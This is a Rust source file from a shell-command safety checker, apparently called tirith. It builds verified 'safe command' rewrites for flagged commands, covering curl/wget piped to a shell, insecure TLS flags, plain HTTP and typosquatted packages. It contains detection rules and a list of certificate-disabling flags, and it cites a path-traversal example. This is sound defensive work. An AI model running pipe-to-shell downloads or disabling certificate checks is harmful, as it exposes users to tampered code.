//! Safe-command suggestions — concrete "what to run instead" rewrites.
//!
//! The engine behind `tirith check --suggest-safe-command`. Purely advisory
//! (never influences detection, verdicts, or exit codes): it inspects a
//! computed [`Verdict`] plus the command and proposes transformations. Every
//! public suggestion constructor composes compatible transformations and
//! re-analyzes the exact final command under the original analysis context. A
//! wrong suggestion is worse than none: a partial transformation remains
//! guidance-only and never crosses the executable field boundary.
//!
//! [`SafeSuggestion::safe_command`] is the only executable rewrite channel.
//!
//! Eight mechanically scoped transformations, each requiring whole-command
//! verification before executable use: pipe-to-shell
//! (hardened `tirith run --capsule`), insecure TLS flag (drop it), plain HTTP→HTTPS,
//! typosquat (`<pm> install <target>`), sudo narrow (drop `sudo` when the inner
//! command is `Allow`), env scrub (`env -u VAR …`), archive list-before-extract,
//! and dotfile backup-then-redirect.

use std::collections::{HashSet, VecDeque};
use std::path::Path;
use std::sync::LazyLock;

use crate::engine::{self, AnalysisContext};
use crate::extract::ScanContext;
use crate::policy::Policy;
use crate::tokenize::{self, ShellType};
use crate::verdict::{Action, Finding, RuleId, Severity, Verdict};

/// A single safe-command suggestion tied to one finding. Multi-step rewrites
/// live in [`Self::safe_command`] with steps joined by ` && `.
#[derive(Debug, Clone, serde::Serialize)]
pub struct SafeSuggestion {
    /// The rule this addresses (snake_case, e.g. `curl_pipe_shell`).
    pub rule_id: String,
    /// A concrete command whose exact final form re-analyzed to
    /// [`Action::Allow`], or `None` when only guidance is available.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub safe_command: Option<String>,
    /// Why the suggestion is safer, or why no rewrite is possible.
    pub rationale: String,
    /// The per-rule remediation advice (always populated; never fabricated).
    pub remediation: String,
}

/// Sensitive env-var names loaded from `sensitive_env.toml` (compiled in via
/// `include_str!`), used by the env-scrub transform and the env-guard rule.
static SENSITIVE_ENV_VARS: LazyLock<Vec<&'static str>> = LazyLock::new(|| {
    #[derive(serde::Deserialize)]
    struct SensitiveEnvFile {
        sensitive: Vec<String>,
    }
    let toml_str = include_str!("../assets/data/sensitive_env.toml");
    let parsed: SensitiveEnvFile = toml::from_str(toml_str).expect("invalid sensitive_env.toml");
    // Leak each string for a `&'static str` — the list is tiny and read once.
    parsed
        .sensitive
        .into_iter()
        .map(|s| Box::leak(s.into_boxed_str()) as &'static str)
        .collect()
});

/// Public accessor for the sensitive env-var list (shared with the env-guard
/// rule so the asset file stays the single source of truth).
pub fn sensitive_env_vars() -> &'static [&'static str] {
    &SENSITIVE_ENV_VARS
}

/// Build verified safe-command suggestions in a default non-interactive Exec
/// context, one [`SafeSuggestion`] per rule id (deduplicated).
///
/// Two command-shape transforms (`sudo_narrow`, `env_scrub`) also run once per
/// verdict, keyed on the command shape / process env rather than a [`RuleId`].
/// The constructed context has no cwd/card/clipboard metadata; callers that own
/// those values should use [`suggest_verified_with_policy`]. Empty when the
/// verdict has no findings.
pub fn suggest(cmd: &str, shell: ShellType, verdict: &Verdict) -> Vec<SafeSuggestion> {
    let ctx = default_exec_context(cmd, shell);
    suggest_verified(&ctx, verdict)
}

fn default_exec_context(cmd: &str, shell: ShellType) -> AnalysisContext {
    AnalysisContext {
        input: cmd.to_string(),
        shell,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: false,
        cwd: None,
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: crate::clipboard::ClipboardSourceState::Unread,
    }
}

/// Build suggestions safe to expose through an executable stdout/eval/JSON
/// contract.
///
/// This convenience entry point discovers the original input's policy once,
/// then delegates to [`suggest_verified_with_policy`]. Enforcement callers that
/// already analyzed the original input should pass that exact returned policy
/// snapshot to the latter function instead of discovering it again.
pub fn suggest_verified(ctx: &AnalysisContext, verdict: &Verdict) -> Vec<SafeSuggestion> {
    if verdict.findings.is_empty() {
        return Vec::new();
    }
    let policy = engine::analyze_without_bypass_returning_policy(ctx).1;
    suggest_verified_with_policy(ctx, verdict, &policy)
}

/// Build suggestions safe to expose through an executable stdout/eval/JSON
/// contract, bound to the exact policy snapshot used for the original verdict.
///
/// Every mechanical candidate is re-analyzed byte-for-byte with the original
/// shell, scan context, cwd, and policy object. Compatible transformations are
/// composed with a bounded breadth-first search. Only the shortest final
/// command whose action is [`Action::Allow`] remains in a `safe_command` field.
/// All other transformations are retained as static guidance, with their
/// candidate command removed from structured output.
pub fn suggest_verified_with_policy(
    ctx: &AnalysisContext,
    verdict: &Verdict,
    policy: &Policy,
) -> Vec<SafeSuggestion> {
    let trusted_runner = trusted_current_tirith_path();
    suggest_verified_with_policy_and_runner(ctx, verdict, policy, trusted_runner.as_deref())
}

fn suggest_verified_with_policy_and_runner(
    ctx: &AnalysisContext,
    verdict: &Verdict,
    policy: &Policy,
    trusted_runner: Option<&Path>,
) -> Vec<SafeSuggestion> {
    let mut suggestions =
        suggest_candidates_with_runner(ctx, verdict, Some(policy), trusted_runner);
    let initial_candidates: Vec<(String, String)> = suggestions
        .iter()
        .filter_map(|suggestion| {
            suggestion
                .safe_command
                .as_ref()
                .map(|command| (command.clone(), suggestion.rule_id.clone()))
        })
        .collect();

    if initial_candidates.is_empty() {
        return suggestions;
    }

    const MAX_COMPOSITION_STEPS: usize = 8;
    const MAX_CANDIDATES: usize = 64;

    #[derive(Debug)]
    struct Candidate {
        command: String,
        rule_path: Vec<String>,
        steps: usize,
    }

    let mut queue = VecDeque::new();
    let mut seen = HashSet::from([ctx.input.clone()]);
    for (command, rule_id) in initial_candidates {
        if seen.insert(command.clone()) {
            queue.push_back(Candidate {
                command,
                rule_path: vec![rule_id],
                steps: 1,
            });
        }
    }

    let mut examined = 0usize;
    let mut verified: Option<Candidate> = None;
    while let Some(candidate) = queue.pop_front() {
        if examined >= MAX_CANDIDATES {
            break;
        }
        examined += 1;

        let candidate_ctx = context_with_input(ctx, candidate.command.clone());
        // Never let a process/inline bypass or a policy-file race bless an
        // executable suggestion. Every candidate uses the original resolved
        // policy object; no policy discovery occurs in this loop.
        let candidate_verdict = engine::analyze_with_policy_without_bypass(&candidate_ctx, policy);
        if candidate_verdict.action == Action::Allow {
            verified = Some(candidate);
            break;
        }

        if candidate.steps >= MAX_COMPOSITION_STEPS {
            continue;
        }

        for next in suggest_candidates_with_runner(
            &candidate_ctx,
            &candidate_verdict,
            Some(policy),
            trusted_runner,
        ) {
            let Some(command) = next.safe_command else {
                continue;
            };
            if seen.insert(command.clone()) {
                let mut rule_path = candidate.rule_path.clone();
                rule_path.push(next.rule_id);
                queue.push_back(Candidate {
                    command,
                    rule_path,
                    steps: candidate.steps + 1,
                });
            }
        }
    }

    // A transformation that was not the exact Allow result is guidance, not an
    // executable command. Do not leak the partial command into the structured
    // contract; human renderers can safely show the static rationale/remediation.
    for suggestion in &mut suggestions {
        if suggestion.safe_command.take().is_some() {
            suggestion.rationale.push_str(
                " The mechanical transformation is guidance-only because the exact resulting command did not independently re-analyze to Allow.",
            );
        }
    }

    if let Some(verified) = verified {
        let anchor_rule = verified.rule_path.first().cloned().unwrap_or_default();
        let anchor = suggestions
            .iter_mut()
            .find(|suggestion| suggestion.rule_id == anchor_rule);
        let rationale = if verified.rule_path.len() == 1 {
            "The exact final command re-analyzed to Allow under the same shell, context, and policy."
                .to_string()
        } else {
            format!(
                "Composes compatible remediations for {}; the exact final command re-analyzed to Allow under the same shell, context, and policy.",
                verified.rule_path.join(", ")
            )
        };

        if let Some(anchor) = anchor {
            anchor.safe_command = Some(verified.command);
            anchor.rationale = rationale;
        } else {
            suggestions.push(SafeSuggestion {
                rule_id: "composed_safe_command".to_string(),
                safe_command: Some(verified.command),
                rationale,
                remediation: "Review the composed command before running it.".to_string(),
            });
        }
    }

    suggestions
}

fn context_with_input(ctx: &AnalysisContext, input: String) -> AnalysisContext {
    let raw_bytes = ctx.raw_bytes.as_ref().map(|_| input.as_bytes().to_vec());
    AnalysisContext {
        input,
        shell: ctx.shell,
        scan_context: ctx.scan_context,
        raw_bytes,
        interactive: ctx.interactive,
        cwd: ctx.cwd.clone(),
        file_path: ctx.file_path.clone(),
        repo_root: ctx.repo_root.clone(),
        is_config_override: ctx.is_config_override,
        clipboard_html: ctx.clipboard_html.clone(),
        card_ref: ctx.card_ref.clone(),
        clipboard_source: ctx.clipboard_source.clone(),
    }
}

fn suggest_candidates_with_runner(
    ctx: &AnalysisContext,
    verdict: &Verdict,
    policy: Option<&Policy>,
    trusted_runner: Option<&Path>,
) -> Vec<SafeSuggestion> {
    let cmd = &ctx.input;
    let shell = ctx.shell;
    let segments = tokenize::tokenize(cmd, shell);
    let mut out: Vec<SafeSuggestion> = Vec::new();
    let mut seen: Vec<RuleId> = Vec::new();

    for finding in &verdict.findings {
        if seen.contains(&finding.rule_id) {
            continue;
        }
        seen.push(finding.rule_id);
        out.push(build_suggestion(
            cmd,
            shell,
            &segments,
            finding,
            trusted_runner,
        ));
    }

    // Command-shape transforms fire at most once per verdict, only when there
    // are findings to rewrite.
    if !verdict.findings.is_empty() {
        if let Some(s) = build_sudo_narrow_suggestion(ctx, &segments, verdict, policy) {
            out.push(s);
        }
        if let Some(s) = build_env_scrub_suggestion(cmd, shell, verdict, ctx.cwd.as_deref(), policy)
        {
            out.push(s);
        }
    }

    out
}

fn build_suggestion(
    cmd: &str,
    shell: ShellType,
    segments: &[tokenize::Segment],
    finding: &Finding,
    trusted_runner: Option<&Path>,
) -> SafeSuggestion {
    let remediation = crate::rule_explanations::remediation(finding.rule_id).to_string();
    let rule_id = finding.rule_id.to_string();

    let (safe_command, rationale) = match finding.rule_id {
        RuleId::CurlPipeShell
        | RuleId::WgetPipeShell
        | RuleId::HttpiePipeShell
        | RuleId::XhPipeShell
        | RuleId::PipeToInterpreter => match rewrite_pipe_to_shell(segments, shell, trusted_runner)
        {
            Some(rewrite) => (
                Some(rewrite),
                "Delegates the bounded download, in-memory policy review, confirmation, \
                 private hash-verified materialization, and execution to Tirith's \
                 fail-closed capsule runner."
                    .to_string(),
            ),
            None => (
                None,
                "No safe executable rewrite is available on this platform or for this \
                 pipeline. Download into a private location, verify and review the exact \
                 bytes, then execute that same copy in a containment boundary."
                    .to_string(),
            ),
        },
        RuleId::InsecureTlsFlags => match rewrite_drop_insecure_tls(cmd, segments) {
            Some(rewrite) => (
                Some(rewrite),
                "Drops the flag that disables TLS certificate verification, restoring \
                 protection against man-in-the-middle tampering."
                    .to_string(),
            ),
            None => (
                None,
                "Remove the insecure TLS flag (-k / --insecure / --no-check-certificate) \
                 so the certificate is verified."
                    .to_string(),
            ),
        },
        RuleId::PlainHttpToSink => match rewrite_http_to_https(cmd) {
            Some(rewrite) => (
                Some(rewrite),
                "Switches the URL to HTTPS so the download is encrypted and \
                 tamper-evident — verify the host actually serves HTTPS."
                    .to_string(),
            ),
            None => (
                None,
                "Fetch the URL over HTTPS instead of plain HTTP.".to_string(),
            ),
        },
        RuleId::ThreatPackageTyposquat => match rewrite_typosquat(segments, shell, finding) {
            Some(rewrite) => (
                Some(rewrite),
                "Replaces the typosquatted package name with the popular package the \
                 threat database identifies it as impersonating."
                    .to_string(),
            ),
            None => (
                None,
                "The threat database flagged this name as a typosquat but did not \
                 unambiguously name a single popular target — pick the legitimate \
                 package by hand."
                    .to_string(),
            ),
        },
        RuleId::ArchiveExtract => match rewrite_archive_list_first(segments, shell) {
            Some(rewrite) => (
                Some(rewrite),
                "Lists the archive contents first so path-traversal entries (e.g. \
                 `../../etc/passwd`) are visible before any file is written to disk."
                    .to_string(),
            ),
            None => (
                None,
                "Inspect the archive contents (e.g. `tar -tzf <archive>`) before \
                 extracting to a sensitive path."
                    .to_string(),
            ),
        },
        RuleId::DotfileOverwrite => match rewrite_dotfile_backup_first(cmd, segments, shell) {
            Some(rewrite) => (
                Some(rewrite),
                "Backs up the existing dotfile before the redirect modifies it, so \
                 the previous configuration can be restored if the change breaks login."
                    .to_string(),
            ),
            None => (
                None,
                "Back up the target dotfile (`cp <file> <file>.bak`) before \
                 redirecting output into it."
                    .to_string(),
            ),
        },
        // Every other rule: no safe mechanical rewrite — remediation guides.
        _ => (
            None,
            "No automatic safe rewrite for this finding — see the remediation below.".to_string(),
        ),
    };

    SafeSuggestion {
        rule_id,
        safe_command,
        rationale,
        remediation,
    }
}

/// Shell interpreters whose stdin invocation contract is represented by
/// [`crate::runner::PipeInterpreter`].
fn pipe_interpreter(name: &str) -> Option<crate::runner::PipeInterpreter> {
    name.parse().ok()
}

/// Rewrite `<fetch> URL | <shell>` into one hardened runner invocation.
///
/// `None` unless the command is exactly a single stdout pipe from a supported
/// URL-fetch command into a supported shell stdin invocation. Every URL,
/// command, and sink argument must be a statically-decodable literal in the
/// caller's shell. Dynamic, malformed, or control-bearing words remain
/// guidance-only.
///
/// On x86_64 Linux, the emitted command carries the selected interpreter, argv,
/// and stdin mode as typed arguments. It invokes the currently-running, validated
/// Tirith executable by absolute path, so later shell evaluation cannot resolve a
/// repo/PATH shadow named `tirith`. The runner therefore ignores a hostile remote
/// shebang and preserves `curl ... | bash`'s stdin semantics. Other architectures
/// and platforms remain guidance-only until their containment backend can prove
/// this launch contract end to end.
fn rewrite_pipe_to_shell(
    segments: &[tokenize::Segment],
    shell: ShellType,
    trusted_runner: Option<&Path>,
) -> Option<String> {
    let _ = trusted_runner;
    if segments.len() != 2 {
        return None;
    }
    let source = &segments[0];
    let sink = &segments[1];
    // `|&` also forwards downloader stderr. The typed runner only forwards the
    // response body, so claiming equivalence would be wrong.
    if sink.preceding_separator.as_deref() != Some("|") {
        return None;
    }
    // PowerShell requires the call operator (`&`) before a quoted executable
    // path.  The tokenizer intentionally does not model that invocation form,
    // so emitting a quoted absolute Tirith path would produce a string value,
    // not an executable command.  Keep both Windows shell families
    // guidance-only until their complete launch grammar is represented.
    if matches!(shell, ShellType::PowerShell | ShellType::Cmd) {
        return None;
    }
    // Prefix assignments can alter downloader or interpreter behavior. The
    // typed runner does not carry an arbitrary environment, so dropping them
    // would not preserve the original invocation.
    if !tokenize::leading_env_assignments(&source.raw).is_empty()
        || !tokenize::leading_env_assignments(&sink.raw).is_empty()
    {
        return None;
    }

    let source_cmd = decode_shell_literal(source.command.as_deref()?, shell)?;
    if !is_url_fetch_command(&source_cmd) {
        return None;
    }
    let sink_cmd = decode_shell_literal(sink.command.as_deref()?, shell)?;
    let interpreter = pipe_interpreter(&sink_cmd)?;

    let source_args = decode_literal_words(&source.args, shell)?;
    let url = supported_fetch_url(&source_cmd, &source_args)?;
    let sink_args = decode_literal_words(&sink.args, shell)?;
    if !crate::runner::pipe_interpreter_args_supported(interpreter, &sink_args) {
        return None;
    }

    let encoded_url = encode_shell_literal(&url, shell)?;
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        let path = trusted_runner?.to_str()?;
        let encoded_tirith = encode_shell_literal(path, shell)?;
        let mut command = format!(
            "{encoded_tirith} run --capsule --script-stdin --interpreter {}",
            interpreter.as_str()
        );
        for arg in sink_args {
            let option = format!("--interpreter-arg={arg}");
            let encoded = encode_shell_literal(&option, shell)?;
            command.push(' ');
            command.push_str(&encoded);
        }
        command.push(' ');
        command.push_str(&encoded_url);
        Some(command)
    }
    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
    {
        let _ = (encoded_url, sink_args, interpreter);
        None
    }
}

fn trusted_current_tirith_path() -> Option<std::path::PathBuf> {
    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        crate::trusted_child::TrustedExecutable::current()
            .ok()?
            .require_safe_reinvocation_provenance()
            .ok()
            .map(|executable| executable.path().to_path_buf())
    }
    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
    {
        None
    }
}

/// Encode one already-decoded argument and prove the selected shell decoder
/// recovers exactly the same UTF-8 bytes. This is intentionally an assertion in
/// the construction path, not merely a quoting best-effort.
fn encode_shell_literal(value: &str, shell: ShellType) -> Option<String> {
    if value.chars().any(char::is_control) {
        return None;
    }
    let encoded = match shell {
        ShellType::Posix | ShellType::Fish => shell_single_quote(value)?,
        ShellType::PowerShell => format!("'{}'", value.replace('\'', "''")),
        ShellType::Cmd => return None,
    };
    (decode_shell_literal(&encoded, shell).as_deref() == Some(value)).then_some(encoded)
}

fn decode_literal_words(words: &[String], shell: ShellType) -> Option<Vec<String>> {
    words
        .iter()
        .map(|word| decode_shell_literal(word, shell))
        .collect()
}

/// Decode a single shell word only when its value is fully literal. Expansion,
/// substitution, globbing, operators, malformed quotes, and decoded controls
/// are rejected instead of being removed or normalized.
fn decode_shell_literal(word: &str, shell: ShellType) -> Option<String> {
    match shell {
        ShellType::Posix => decode_posix_literal(word),
        ShellType::Fish => decode_fish_literal(word),
        ShellType::PowerShell => decode_powershell_literal(word),
        ShellType::Cmd => None,
    }
}

fn push_literal(out: &mut String, ch: char) -> Option<()> {
    if ch.is_control() {
        return None;
    }
    out.push(ch);
    Some(())
}

fn decode_posix_literal(word: &str) -> Option<String> {
    #[derive(Clone, Copy)]
    enum Quote {
        Bare,
        Single,
        Double,
    }

    let chars: Vec<char> = word.chars().collect();
    let mut out = String::new();
    let mut quote = Quote::Bare;
    let mut i = 0usize;
    while i < chars.len() {
        let ch = chars[i];
        match quote {
            Quote::Bare => match ch {
                '\'' => quote = Quote::Single,
                '"' => quote = Quote::Double,
                '\\' => {
                    i += 1;
                    push_literal(&mut out, *chars.get(i)?)?;
                }
                // These have expansion, substitution, glob, grouping, or
                // operator meaning when unquoted.
                '$' | '`' | '*' | '?' | '[' | ']' | '{' | '}' | '(' | ')' | '<' | '>' | '|'
                | '&' | ';' | '!' => return None,
                '~' if out.is_empty() => return None,
                c if c.is_whitespace() || c.is_control() => return None,
                c => push_literal(&mut out, c)?,
            },
            Quote::Single => {
                if ch == '\'' {
                    quote = Quote::Bare;
                } else {
                    push_literal(&mut out, ch)?;
                }
            }
            Quote::Double => match ch {
                '"' => quote = Quote::Bare,
                '$' | '`' => return None,
                '\\' => {
                    let next = *chars.get(i + 1)?;
                    if matches!(next, '$' | '`' | '"' | '\\') {
                        i += 1;
                        push_literal(&mut out, next)?;
                    } else if next == '\n' {
                        return None;
                    } else {
                        // POSIX preserves a backslash before other characters
                        // inside double quotes.
                        push_literal(&mut out, '\\')?;
                    }
                }
                c => push_literal(&mut out, c)?,
            },
        }
        i += 1;
    }
    if !matches!(quote, Quote::Bare) || out.is_empty() {
        return None;
    }
    Some(out)
}

fn decode_fish_literal(word: &str) -> Option<String> {
    #[derive(Clone, Copy)]
    enum Quote {
        Bare,
        Single,
        Double,
    }

    let chars: Vec<char> = word.chars().collect();
    let mut out = String::new();
    let mut quote = Quote::Bare;
    let mut i = 0usize;
    while i < chars.len() {
        let ch = chars[i];
        match quote {
            Quote::Bare => match ch {
                '\'' => quote = Quote::Single,
                '"' => quote = Quote::Double,
                // Fish's unquoted backslash grammar includes semantic escapes
                // (`\\xNN`, octal, `\\uNNNN`, `\\UNNNNNNNN`, `\\e`, and
                // control-producing forms). A one-character POSIX-style decoder
                // cannot preserve those bytes. Refuse every bare backslash and
                // keep the finding guidance-only rather than emit a rewrite whose
                // URL or argv differs from what Fish would execute.
                '\\' => return None,
                '$' | '*' | '?' | '(' | ')' | '{' | '}' | '[' | ']' | '<' | '>' | '|' | '&'
                | ';' => return None,
                '~' if out.is_empty() => return None,
                c if c.is_whitespace() || c.is_control() => return None,
                c => push_literal(&mut out, c)?,
            },
            Quote::Single => match ch {
                '\'' => quote = Quote::Bare,
                '\\' if matches!(chars.get(i + 1), Some('\'' | '\\')) => {
                    i += 1;
                    push_literal(&mut out, chars[i])?;
                }
                c => push_literal(&mut out, c)?,
            },
            Quote::Double => match ch {
                '"' => quote = Quote::Bare,
                '$' | '(' | ')' => return None,
                '\\' => {
                    let next = *chars.get(i + 1)?;
                    if matches!(next, '$' | '"' | '\\') {
                        i += 1;
                        push_literal(&mut out, next)?;
                    } else if next == '\n' {
                        return None;
                    } else {
                        push_literal(&mut out, '\\')?;
                    }
                }
                c => push_literal(&mut out, c)?,
            },
        }
        i += 1;
    }
    if !matches!(quote, Quote::Bare) || out.is_empty() {
        return None;
    }
    Some(out)
}

fn decode_powershell_literal(word: &str) -> Option<String> {
    #[derive(Clone, Copy)]
    enum Quote {
        Bare,
        Single,
        Double,
    }

    fn escaped(ch: char) -> char {
        match ch {
            '0' => '\0',
            'a' => '\u{0007}',
            'b' => '\u{0008}',
            'e' => '\u{001b}',
            'f' => '\u{000c}',
            'n' => '\n',
            'r' => '\r',
            't' => '\t',
            'v' => '\u{000b}',
            other => other,
        }
    }

    let chars: Vec<char> = word.chars().collect();
    let mut out = String::new();
    let mut quote = Quote::Bare;
    let mut i = 0usize;
    while i < chars.len() {
        let ch = chars[i];
        // PowerShell treats curly quote characters as string delimiters too.
        // The command tokenizer does not model those alternate delimiters, so
        // refuse them instead of decoding them as ordinary URL bytes.
        if matches!(ch, '\u{2018}' | '\u{2019}' | '\u{201c}' | '\u{201d}') {
            return None;
        }
        match quote {
            Quote::Bare => match ch {
                '\'' => quote = Quote::Single,
                '"' => quote = Quote::Double,
                '`' => {
                    i += 1;
                    let next = *chars.get(i)?;
                    // PowerShell 6+ consumes the full `u{...}` sequence as one
                    // Unicode escape. This bounded decoder intentionally does
                    // not implement that variable-length grammar.
                    if next == 'u' && chars.get(i + 1) == Some(&'{') {
                        return None;
                    }
                    push_literal(&mut out, escaped(next))?;
                }
                '$' | '@' | '*' | '?' | '[' | ']' | '{' | '}' | '(' | ')' | '<' | '>' | '|'
                | '&' | ';' | ',' => return None,
                c if c.is_whitespace() || c.is_control() => return None,
                c => push_literal(&mut out, c)?,
            },
            Quote::Single => {
                if ch == '\'' {
                    if chars.get(i + 1) == Some(&'\'') {
                        i += 1;
                        push_literal(&mut out, '\'')?;
                    } else {
                        quote = Quote::Bare;
                    }
                } else {
                    push_literal(&mut out, ch)?;
                }
            }
            Quote::Double => match ch {
                '"' if chars.get(i + 1) == Some(&'"') => {
                    i += 1;
                    push_literal(&mut out, '"')?;
                }
                '"' => quote = Quote::Bare,
                '$' => return None,
                '`' => {
                    i += 1;
                    let next = *chars.get(i)?;
                    if next == 'u' && chars.get(i + 1) == Some(&'{') {
                        return None;
                    }
                    push_literal(&mut out, escaped(next))?;
                }
                c => push_literal(&mut out, c)?,
            },
        }
        i += 1;
    }
    if !matches!(quote, Quote::Bare) || out.is_empty() {
        return None;
    }
    Some(out)
}

/// Return the one exact HTTPS response-body URL represented by a supported
/// downloader argv. Unsupported downloader behavior remains guidance-only.
fn supported_fetch_url(command: &str, args: &[String]) -> Option<String> {
    let mut urls = Vec::new();
    match command {
        "curl" => {
            let mut fail_on_http_error = false;
            let mut follow_redirects = false;
            for arg in args {
                if starts_with_http(arg) {
                    urls.push(arg.clone());
                } else if let Some(long) = arg.strip_prefix("--") {
                    if !matches!(long, "fail" | "silent" | "show-error" | "location") {
                        return None;
                    }
                    fail_on_http_error |= long == "fail";
                    follow_redirects |= long == "location";
                } else {
                    let short = arg.strip_prefix('-')?;
                    if short.is_empty()
                        || !short.chars().all(|ch| matches!(ch, 'f' | 's' | 'S' | 'L'))
                    {
                        return None;
                    }
                    fail_on_http_error |= short.contains('f');
                    follow_redirects |= short.contains('L');
                }
            }
            // Tirith's bounded fetcher follows validated redirects and rejects
            // every non-2xx response. A curl pipeline has those semantics only
            // when both -L/--location and -f/--fail are explicit; otherwise the
            // rewrite could execute different response bytes than the literal
            // command. Keep mismatched forms guidance-only.
            if !(fail_on_http_error && follow_redirects) {
                return None;
            }
        }
        "wget" => {
            let mut stdout = false;
            let mut index = 0usize;
            while index < args.len() {
                let arg = &args[index];
                if starts_with_http(arg) {
                    urls.push(arg.clone());
                } else if matches!(arg.as_str(), "-q" | "--quiet") {
                } else if matches!(arg.as_str(), "-qO-" | "-O-") {
                    stdout = true;
                } else if arg == "-O" && args.get(index + 1).is_some_and(|next| next == "-") {
                    stdout = true;
                    index += 1;
                } else {
                    return None;
                }
                index += 1;
            }
            if !stdout {
                return None;
            }
        }
        // HTTPie/xh/fetch output formatting and option semantics are not yet a
        // proven byte-for-byte body stream contract.
        _ => return None,
    }
    if urls.len() != 1 {
        return None;
    }
    let url = urls.pop()?;
    if url.chars().any(char::is_control) {
        return None;
    }
    let parsed = url::Url::parse(&url).ok()?;
    if parsed.scheme() != "https" || parsed.host_str().is_none() || parsed.as_str() != url {
        return None;
    }
    Some(url)
}

/// Remove insecure TLS flags, preserving everything else verbatim.
///
/// Byte-span splicing: removes each whitespace-delimited run whose content
/// (quotes stripped) is exactly an insecure flag, plus one adjacent gap. These
/// flags have no internal whitespace, so quoted args with spaces are untouched.
/// `None` if no flag is present, or if the segment-level view (the detector's)
/// doesn't also see one — so a `-k` buried in a quoted string is never rewritten.
fn rewrite_drop_insecure_tls(cmd: &str, segments: &[tokenize::Segment]) -> Option<String> {
    const INSECURE: &[&str] = &["-k", "--insecure", "--no-check-certificate"];

    // Cross-check the tokenizer: rewrite only when a real arg token is an
    // insecure flag, not when `-k` appears inside another argument.
    let detector_sees_it = segments.iter().any(|seg| {
        seg.args
            .iter()
            .any(|a| INSECURE.contains(&strip_quotes(a).as_str()))
    });
    if !detector_sees_it {
        return None;
    }

    // Byte spans of whitespace-delimited runs that are insecure flags.
    let bytes = cmd.as_bytes();
    let mut spans: Vec<(usize, usize)> = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i].is_ascii_whitespace() {
            i += 1;
            continue;
        }
        let start = i;
        while i < bytes.len() && !bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        let run = &cmd[start..i];
        if INSECURE.contains(&strip_quotes(run).as_str()) {
            spans.push((start, i));
        }
    }
    if spans.is_empty() {
        return None;
    }

    // Rebuild the command, dropping each flagged span plus the single
    // preceding space so `curl -k URL` collapses to `curl URL`.
    let mut out = String::with_capacity(cmd.len());
    let mut cursor = 0;
    for (start, end) in spans {
        let mut keep_until = start;
        if keep_until > cursor && bytes[keep_until - 1].is_ascii_whitespace() {
            keep_until -= 1;
        }
        out.push_str(&cmd[cursor..keep_until]);
        cursor = end;
    }
    out.push_str(&cmd[cursor..]);
    let result = out.trim().to_string();
    if result.is_empty() || result == cmd.trim() {
        return None;
    }
    Some(result)
}

/// Rewrite the first `http://` URL in the command to `https://`. `None` if
/// there's no plain-HTTP URL. The caller adds the caveat that the host must
/// actually serve HTTPS.
fn rewrite_http_to_https(cmd: &str) -> Option<String> {
    // Case-insensitive `http://` not preceded by 's' (so `https://` is skipped).
    let lower = cmd.to_ascii_lowercase();
    let bytes = lower.as_bytes();
    let mut idx = 0;
    while let Some(rel) = lower[idx..].find("http://") {
        let pos = idx + rel;
        let preceded_by_s = pos > 0 && (bytes[pos - 1] == b's' || bytes[pos - 1] == b'S');
        if !preceded_by_s {
            let mut rewritten = String::with_capacity(cmd.len() + 1);
            rewritten.push_str(&cmd[..pos + 4]); // up to and including "http"
            rewritten.push('s');
            rewritten.push_str(&cmd[pos + 4..]);
            return Some(rewritten);
        }
        idx = pos + 7;
    }
    None
}

// ── Typosquat rewrite ───────────────────────────────────────────────────────

/// Extract the typosquat target name from a `ThreatPackageTyposquat` finding.
/// Both producers format the title as `"Confirmed typosquat: <name> →
/// <target>"`; `install_txn.rs` also stamps `typosquat_of=<target>` into the
/// evidence, checked as a backup against a future title tweak.
fn typosquat_target(finding: &Finding) -> Option<String> {
    // Primary parse from the title — `→` is BMP so byte-indexing is safe.
    let arrow = " → ";
    if let Some(idx) = finding.title.find(arrow) {
        let target = finding.title[idx + arrow.len()..].trim();
        if !target.is_empty() && !target.contains(char::is_whitespace) {
            return Some(target.to_string());
        }
    }

    // Backup parse: install_txn evidence carries `typosquat_of=<name>`.
    for ev in &finding.evidence {
        if let crate::verdict::Evidence::Text { detail } = ev {
            if let Some(pos) = detail.find("typosquat_of=") {
                let after = &detail[pos + "typosquat_of=".len()..];
                let end = after
                    .find(|c: char| c.is_ascii_whitespace())
                    .unwrap_or(after.len());
                let target = after[..end].trim();
                if !target.is_empty() {
                    return Some(target.to_string());
                }
            }
        }
    }

    None
}

/// Package-manager `install` shape detector → `(pm_binary, install_verb)` when
/// `segments` is one segment whose leader is a recognized PM and the first
/// non-flag arg is an install verb (preserved, so `npm i` stays `npm i`). The
/// supported set mirrors the install-txn engine pass; others get no rewrite.
fn detect_pm_install(segments: &[tokenize::Segment], shell: ShellType) -> Option<(String, String)> {
    if segments.len() != 1 {
        return None;
    }
    let seg = &segments[0];
    let cmd = base_command(seg.command.as_deref()?, shell);
    let install_verbs: &[(&str, &[&str])] = &[
        ("pip", &["install"]),
        ("pip3", &["install"]),
        ("npm", &["install", "i", "add"]),
        ("yarn", &["add"]),
        ("pnpm", &["add", "install", "i"]),
        ("cargo", &["install", "add"]),
        ("gem", &["install"]),
        ("go", &["install", "get"]),
    ];

    let (_, verbs) = install_verbs.iter().find(|(name, _)| *name == cmd)?;
    let verb_arg = seg
        .args
        .iter()
        .find(|a| !strip_quotes(a).starts_with('-'))?;
    let verb = strip_quotes(verb_arg);
    if !verbs.contains(&verb.as_str()) {
        return None;
    }
    Some((cmd, verb))
}

/// Build a typosquat rewrite when the target is unambiguous. `None` when the
/// finding exposes no single target, or the command isn't a recognized `<pm>
/// install <name>` (the only shape we can mechanically rewrite).
fn rewrite_typosquat(
    segments: &[tokenize::Segment],
    shell: ShellType,
    finding: &Finding,
) -> Option<String> {
    let target = typosquat_target(finding)?;
    let target = sanitize_for_display(&target);
    if target.is_empty() {
        return None;
    }
    // The target name is parsed out of an untrusted finding title / evidence;
    // single-quote it so it can't inject shell syntax into `<pm> install …`.
    let target = shell_single_quote(&target)?;
    let (pm, verb) = detect_pm_install(segments, shell)?;
    Some(format!("{pm} {verb} {target}"))
}

// ── Archive list-before-extract ────────────────────────────────────────────

